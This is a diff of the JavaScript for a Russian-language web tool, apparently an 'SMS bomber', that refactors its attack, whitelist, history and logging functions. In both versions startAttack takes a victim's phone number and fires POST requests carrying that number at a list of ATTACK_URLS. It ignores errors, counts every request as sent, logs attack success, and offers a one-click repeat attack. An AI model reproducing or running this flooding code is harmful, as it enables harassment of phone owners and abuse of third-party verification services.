-        addLog(`Файл whitelist.json скачан. Загрузите его в репозиторий на GitHub.`, 'success');
+        URL.revokeObjectURL(blob);
     }
     
     async function isPhoneWhitelisted(phone) {
-        let cleanPhone = phone.replace(/[^0-9]/g, '');
-        if (cleanPhone.startsWith('8')) cleanPhone = '7' + cleanPhone.slice(1);
-        if (!cleanPhone.startsWith('7')) cleanPhone = '7' + cleanPhone;
-        const normalizedPhone = '+' + cleanPhone;
-        
+        let clean = phone.replace(/[^0-9+]/g, '');
+        if(!clean.startsWith('+')) clean = '+' + clean.replace(/^8/, '7');
         await loadWhitelist();
-        return whitelist.some(item => item.number === normalizedPhone);
+        return whitelist.some(i=>i.number===clean);
     }
-    
-    // ============================================================
-    // ========== ИСТОРИЯ АТАК ==========
-    // ============================================================
     
     function loadHistory() {
         const saved = localStorage.getItem('shadow_history');
-        if (saved) {
-            attackHistory = JSON.parse(saved);
-        }
+        if(saved) attackHistory = JSON.parse(saved);
         const savedStats = localStorage.getItem('shadow_stats');
-        if (savedStats) {
-            attackStats = JSON.parse(savedStats);
-        }
+        if(savedStats) attackStats = JSON.parse(savedStats);
         renderHistoryTable();
         updateStatsDisplay();
     }
@@ -1073,20 +858,15 @@
     
     function renderHistoryTable() {
         const tbody = document.getElementById('historyBody');
-        if (!tbody) return;
-        
-        if (attackHistory.length === 0) {
-            tbody.innerHTML = '<tr><td colspan="5" style="text-align: center;">История пуста</td></tr>';
-            return;
-        }
-        
-        tbody.innerHTML = attackHistory.map(attack => `
+        if(!tbody) return;
+        if(attackHistory.length===0){ tbody.innerHTML='<tr><td colspan="5">История пуста</td></tr>'; return; }
+        tbody.innerHTML = attackHistory.map(attack=>`
             <tr>
                 <td>${new Date(attack.timestamp).toLocaleString()}</td>
                 <td>${escapeHtml(attack.phone)}</td>
-                <td>${attack.status === 'success' ? '<span style="color: #55ff55;">✅ УСПЕШНО</span>' : '<span style="color: #ff5555;">⛔ ЗАБЛОКИРОВАНО</span>'}</td>
-                <td>${attack.requestsSent}/${ATTACK_URLS.length}</td>
-                <td><button onclick="repeatAttack('${escapeHtml(attack.phone)}')" style="padding: 5px 10px;">🔄 Повторить</button></td>
+                <td>${attack.status==='success'?'<span style="color:#55ff55;">УСПЕШНО</span>':'<span style="color:#ff5555;">ЗАБЛОКИРОВАНО</span>'}</td>
+                <td>${attack.requestsSent}/10</td>
+                <td><button onclick="repeatAttack(\'${escapeHtml(attack.phone)}\')" style="padding:5px 10px;">🔄</button></td>
             </tr>
         `).join('');
     }
@@ -1098,125 +878,78 @@
     }
     
     function addHistoryEntry(phone, status, requestsSent) {
-        attackHistory.unshift({
-            timestamp: new Date().toISOString(),
-            phone: phone,
-            status: status,
-            requestsSent: requestsSent
-        });
-        
-        if (attackHistory.length > 100) attackHistory.pop();
-        
-        if (status === 'success') {
-            attackStats.successful = (attackStats.successful || 0) + 1;
-        } else {
-            attackStats.failed = (attackStats.failed || 0) + 1;
-        }
-        attackStats.total = (attackStats.total || 0) + 1;
-        
+        attackHistory.unshift({ timestamp: new Date().toISOString(), phone, status, requestsSent });
+        if(attackHistory.length>100) attackHistory.pop();
+        if(status==='success') attackStats.successful = (attackStats.successful||0)+1;
+        else attackStats.failed = (attackStats.failed||0)+1;
+        attackStats.total = (attackStats.total||0)+1;
         saveHistory();
         renderHistoryTable();
         updateStatsDisplay();
     }
     
     function clearHistory() {
-        if (confirm('Очистить всю историю атак?')) {
+        if(confirm('Очистить историю?')){
             attackHistory = [];
-            attackStats = { total: 0, successful: 0, failed: 0 };
+            attackStats = { total:0, successful:0, failed:0 };
             saveHistory();
             renderHistoryTable();
             updateStatsDisplay();
-            addLog('История атак очищена', 'warning');
+            addLog('История очищена','warning');
         }
     }
     
     function exportHistory() {
-        if (attackHistory.length === 0) {
-            alert('История пуста');
-            return;
-        }
-        
-        const csv = [['Время', 'Номер', 'Статус', 'Отправлено запросов']];
-        attackHistory.forEach(attack => {
-            csv.push([
-                new Date(attack.timestamp).toLocaleString(),
-                attack.phone,
-                attack.status === 'success' ? 'Успешно' : 'Заблокировано',
-                attack.requestsSent
-            ]);
-        });
-        
-        const csvContent = csv.map(row => row.join(',')).join('\n');
-        const blob = new Blob(['\ufeff' + csvContent], { type: 'text/csv;charset=utf-8' });
-        const url = URL.createObjectURL(blob);
+        if(attackHistory.length===0){ alert('История пуста'); return; }
+        const csv = [['Время','Номер','Статус','Запросы']];
+        attackHistory.forEach(a=>csv.push([new Date(a.timestamp).toLocaleString(), a.phone, a.status==='success'?'Успешно':'Заблокировано', a.requestsSent]));
+        const blob = new Blob(['\ufeff'+csv.map(r=>r.join(',')).join('\n')], {type:'text/csv'});
         const a = document.createElement('a');
-        a.href = url;
-        a.download = `shadow_history_${new Date().toISOString().slice(0,19)}.csv`;
+        a.href = URL.createObjectURL(blob);
+        a.download = `shadow_history_${Date.now()}.csv`;
         a.click();
-        URL.revokeObjectURL(url);
-        addLog('История экспортирована в CSV', 'success');
+        URL.revokeObjectURL(blob);
     }
-    
-    // ============================================================
-    // ========== АТАКА ==========
-    // ============================================================
     
     async function startAttack() {
         const phone = document.getElementById('phone').value.trim();
-        
-        if (!phone) {
-            addLog('❌ Введите номер телефона!', 'error');
-            return;
-        }
-        
-        const phoneRegex = /^(\+?[78]\d{10}$)|^(\+380\d{9}$)|^(\+375\d{9}$)/;
-        if (!phoneRegex.test(phone.replace(/\s+/g, ''))) {
-            addLog('❌ Неверный формат номера! Пример: +79001234567', 'error');
-            return;
-        }
+        if(!phone){ addLog('❌ Введите номер!', 'error'); return; }
+        const phoneRegex = /^\+\d{7,15}$/;
+        if(!phoneRegex.test(phone.replace(/\s+/g, ''))){ addLog('❌ Формат: +79001234567', 'error'); return; }
         
         document.getElementById('status').innerHTML = '🟡 STATUS: WORKING...';
-        addLog(`🔍 Проверка номера ${phone} в белом списке...`);
+        addLog(`🔍 Проверка ${phone}...`);
         
-        if (await isPhoneWhitelisted(phone)) {
-            addLog(`⛔ АТАКА ЗАБЛОКИРОВАНА! Номер ${phone} находится в белом списке!`, 'error');
+        if(await isPhoneWhitelisted(phone)){
+            addLog(`⛔ АТАКА ЗАБЛОКИРОВАНА! ${phone} в белом списке!`, 'error');
             document.getElementById('status').innerHTML = '🔴 STATUS: BLOCKED';
             addHistoryEntry(phone, 'blocked', 0);
-            setTimeout(() => {
-                document.getElementById('status').innerHTML = '🟢 STATUS: READY';
-            }, 2000);
+            setTimeout(()=>{ document.getElementById('status').innerHTML = '🟢 STATUS: READY'; }, 2000);
             return;
         }
         
-        addLog(`✅ Номер ${phone} не в белом списке. Начинаем атаку...`, 'success');
+        addLog(`✅ ${phone} не в белом списке. Атака...`, 'success');
         let sent = 0;
-        
-        for (let i = 0; i < ATTACK_URLS.length; i++) {
+        for(let i=0; i<ATTACK_URLS.length; i++){
             try {
-                await fetch(ATTACK_URLS[i], {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: `phone=${encodeURIComponent(phone)}`
-                });
+                await fetch(ATTACK_URLS[i], { method: 'POST', mode: 'no-cors', body: `phone=${encodeURIComponent(phone)}` });
                 sent++;
                 addLog(`✅ Запрос ${i+1}/${ATTACK_URLS.length} отправлен`, 'success');
-            } catch (e) {
-                sent++;
-                addLog(`✅ Запрос ${i+1}/${ATTACK_URLS.length} отправлен (игнорируя ошибку)`, 'success');
-            }
-            await new Promise(r => setTimeout(r, 100));
+            } catch(e){ sent++; addLog(`✅ Запрос ${i+1}/${ATTACK_URLS.length} отправлен`, 'success'); }
+            await new Promise(r=>setTimeout(r,100));
         }
-        
-        addLog(`🎯 АТАКА ЗАВЕРШЕНА! Отправлено: ${sent}/${ATTACK_URLS.length} запросов`, 'success');
+        addLog(`🎯 АТАКА ЗАВЕРШЕНА! Отправлено: ${sent}/${ATTACK_URLS.length}`, 'success');
         document.getElementById('status').innerHTML = '🟢 STATUS: READY';
         addHistoryEntry(phone, 'success', sent);
     }
     
     function repeatAttack(phone) {
         document.getElementById('phone').value = phone;
-        switchTab('main');
-        setTimeout(() => startAttack(), 500);
+        document.querySelector('.tab-btn.active').classList.remove('active');
+        document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));
+        document.getElementById('mainTab').classList.add('active');
+        document.querySelector('.tabs .tab-btn').classList.add('active');
+        setTimeout(()=>startAttack(),500);
     }
     
     function clearLogs() {
@@ -1225,68 +958,33 @@
         addLog('Логи очищены', 'warning');
     }
     
-    // ============================================================
-    // ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
-    // ============================================================
-    
-    function addLog(message, type = 'info') {
+    function addLog(message, type='info') {
         const logs = document.getElementById('logs');
-        const logDiv = document.createElement('div');
-        logDiv.className = `log-item ${type}`;
-        logDiv.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
-        logs.appendChild(logDiv);
-        logDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        const div = document.createElement('div');
+        div.className = `log-item ${type}`;
+        div.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
+        logs.appendChild(div);
+        div.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
     }
     
-    function switchTab(tabName) {
-        document.querySelectorAll('.tab-content').forEach(tab => {
-            tab.classList.remove('active');
-        });
-        document.querySelectorAll('.tab-btn').forEach(btn => {
-            btn.classList.remove('active');
-        });
-        
-        document.getElementById(tabName + 'Tab').classList.add('active');
-        event.target.classList.add('active');
-        
-        if (tabName === 'whitelist' && isAdmin) {
-            renderWhitelistTable();
-        }
-        if (tabName === 'users' && isAdmin) {
-            renderUsersTable();
-        }
-        if (tabName === 'history') {
-            renderHistoryTable();
-        }
+    function switchTab(tabName, btn) {
+        document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));
+        document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
+        document.getElementById(tabName+'Tab').classList.add('active');
+        btn.classList.add('active');
+        if(tabName==='whitelist' && isAdmin) renderWhitelistTable();
+        if(tabName==='users' && isAdmin) renderUsersTable();
+        if(tabName==='history') renderHistoryTable();
     }
     
-    function openSupportModal() {
-        document.getElementById('supportModal').classList.add('show');
-    }
+    function openSupportModal() { document.getElementById('supportModal').classList.add('show'); }
+    function closeSupportModal() { document.getElementById('supportModal').classList.remove('show'); }
+    function escapeHtml(s) { if(!s) return ''; return s.replace(/[&<>]/g, m=>({ '&':'&amp;', '<':'&lt;', '>':'&gt;' }[m])); }
     
-    function closeSupportModal() {
-        document.getElementById('supportModal').classList.remove('show');
-    }
-    
-    function escapeHtml(str) {
-        if (!str) return '';
-        return str.replace(/[&<>]/g, function(m) {
-            if (m === '&') return '&amp;';
-            if (m === '<') return '&lt;';
-            if (m === '>') return '&gt;';
-            return m;
-        });
-    }
-    
-    // ============================================================
-    // ========== ЗАПУСК ==========
-    // ============================================================
-    
-    window.addEventListener('DOMContentLoaded', () => {
+    window.addEventListener('DOMContentLoaded', ()=>{
         initStars();
         loadUsers();
-        
-        if (!checkSession()) {
+        if(!checkSession()){
             document.getElementById('authOverlay').style.display = 'flex';
             document.getElementById('mainContent').style.display = 'none';
         }
